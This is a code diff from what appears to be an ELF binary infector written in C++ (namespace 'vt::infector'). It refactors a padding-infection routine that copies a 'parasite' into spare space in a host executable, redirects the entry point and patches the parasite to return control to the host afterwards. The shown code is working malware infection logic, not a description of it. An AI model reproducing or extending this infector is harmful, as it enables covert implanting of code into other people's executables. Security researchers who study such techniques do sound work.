@@ -68,16 +68,6 @@ Elf64_Addr patch_ehdr(vt::common::Mmap<PROT_READ | PROT_WRITE>& host_mapping,
   return original_entry_point;
 }
 
-bool patch_parasite_and_resume_control(
-    Elf64_Addr original_entry_point, size_t parasite_size,
-    vt::common::Mmap<PROT_READ | PROT_WRITE>& host_mapping,
-    Elf64_Addr parasite_load_address, Elf64_Off parasite_file_offset) {
-  auto header = reinterpret_cast<const Elf64_Ehdr*>(host_mapping.base());
-  return patch_parasite_and_relinquish_control(
-      header->e_type, original_entry_point, parasite_load_address,
-      parasite_file_offset, parasite_size, host_mapping);
-}
-
 }  // namespace
 
 // Gather information about the elf that can be used to inject parasite into a
@@ -159,7 +149,7 @@ bool PaddingInfect::analyze(const common::Mmap<PROT_READ>& host,
   return false;
 }
 
-bool PaddingInfect::infect(
+bool PaddingInfect::inject(
     vt::common::Mmap<PROT_READ | PROT_WRITE> host_mapping,
     vt::common::Mmap<PROT_READ> parasite_mapping) {
   if (padding_size_ < parasite_mapping.size()) {
@@ -188,9 +178,10 @@ bool PaddingInfect::infect(
              parasite_mapping.base(), parasite_mapping.size());
 
   // Patch parasite to resume host code after execution.
-  return patch_parasite_and_resume_control(
-      original_entry_point, parasite_mapping.size(), host_mapping,
-      parasite_load_address_, parasite_file_offset_);
+  const auto& ehdr = *reinterpret_cast<const Elf64_Ehdr*>(host_mapping.base());
+  return patch_parasite_and_relinquish_control(
+      ehdr.e_type, original_entry_point, parasite_load_address_,
+      parasite_file_offset_, parasite_mapping.size(), host_mapping);
 }
 
 }  // namespace vt::infector
